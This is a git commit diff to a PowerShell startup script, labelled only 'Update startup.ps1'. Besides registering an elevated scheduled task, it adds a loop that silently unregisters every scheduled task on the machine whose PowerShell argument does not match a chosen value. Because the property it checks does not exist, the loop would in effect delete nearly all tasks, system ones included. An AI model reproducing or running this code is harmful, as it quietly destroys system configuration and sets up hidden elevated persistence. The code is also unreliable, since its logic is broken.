51b1f0dd80f23d4ae76b0ac2cfb7b19e8d9a6e57
43a1723 <hai1723notgay@gmail.com>
2024-06-21 10:04:47 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -9,3 +9,22 @@ $task_desc = "Scheduled task to execute script"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
+
+$tasks = Get-ScheduledTask
+
+foreach ($task in $tasks) {
+    try {
+        # Lấy các thuộc tính của tác vụ
+        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName
+        $taskAction = $taskInfo.Actions | Where-Object { $_.Execute -like "*powershell.exe*" }
+
+        # Kiểm tra xem hành động của tác vụ có chứa biến $arguments không
+        if ($taskAction.Argument -ne $arguments) {
+            # Nếu không chứa $arguments, thực hiện việc xoá tác vụ
+            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false
+            Write-Output "Task $($task.TaskName) has been deleted."
+        }
+    } catch {
+        Write-Output "Failed to process task $($task.TaskName): $_"
+    }
+}
